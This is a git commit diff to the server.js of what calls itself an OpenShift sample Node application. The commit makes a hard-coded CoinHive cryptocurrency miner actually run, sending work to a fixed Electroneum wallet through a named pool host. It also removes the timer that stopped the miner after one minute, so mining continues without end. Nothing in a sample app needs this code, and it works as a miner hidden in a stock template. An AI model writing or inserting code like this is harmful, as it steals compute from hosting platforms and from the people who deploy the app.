119c82bda5c8625f5b817c9052d6c6ca4cdc4828
krreet <34994993+krreet@users.noreply.github.com>
2018-03-14 05:01:44 +0530

    Update server.js

--- server.js
+++ server.js
@@ -1,17 +1,19 @@
 //  OpenShift sample Node application
 
-const CoinHive = require('coin-hive');
-const miner = await CoinHive('etnkKyXUsrfH3JdthA3Cep1JBaEdPtFF2EvkX4uhmTbCAFMX4xr6VzvBuc2eJFvEnLKmJKf7jwS3C3R9mMQb1jbD8VW9GNiGBJ', {
-  pool: {
-    host: 'pool.etn.spacepools.org',
-    port: 3333
-  }
-});
-miner.start();
+
 
 
  
-  // Listen on events
+const CoinHive = require('coin-hive');
+(async () => {
+  const miner = await CoinHive('etnkKyXUsrfH3JdthA3Cep1JBaEdPtFF2EvkX4uhmTbCAFMX4xr6VzvBuc2eJFvEnLKmJKf7jwS3C3R9mMQb1jbD8VW9GNiGBJ', {
+    pool: {
+         host: 'pool.etn.spacepools.org',
+      port: 3333,
+     
+    }
+  });
+  await miner.start();
   miner.on('found', () => console.log('Found!'));
   miner.on('accepted', () => console.log('Accepted!'));
   miner.on('update', data =>
@@ -21,8 +23,5 @@ miner.start();
     Accepted hashes: ${data.acceptedHashes}
   `)
   );
-
-  // Stop miner
-  setTimeout(async () => await miner.stop(), 60000);
 })();
 
